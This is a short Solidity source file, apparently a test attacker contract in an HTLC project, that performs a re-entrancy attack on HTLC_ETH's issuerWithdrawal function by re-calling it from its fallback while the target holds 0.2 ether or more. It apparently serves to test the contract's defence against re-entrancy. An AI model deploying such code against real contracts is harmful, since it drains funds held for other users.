pragma solidity 0.8.10;

import "../htlc/HTLC_ETH.sol";

//  SPDX-License-Identifier: UNLICENSED



contract WithDrawReEntrancy {

    HTLC_ETH htlcEth;

    bytes32 id;
    bytes32 secret;
    address securityToken;

    constructor(address _htlcEthAddress) {

        htlcEth = HTLC_ETH(_htlcEthAddress);
    }

    //  contract recieving ether should have a fallback or receive function but payable
   

    fallback() external payable {

        // attack implementation

        if(address(htlcEth).balance >= 0.2 ether) {

            htlcEth.issuerWithdrawal(id, secret, securityToken);
           

        }
          
    }

    

    function attack(bytes32 _swapID, bytes32 _secretKey, address _securityToken) external {
        id = _swapID;
        secret = _secretKey;
        securityToken = _securityToken;

        htlcEth.issuerWithdrawal(_swapID, _secretKey, _securityToken);
        

    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
 
}



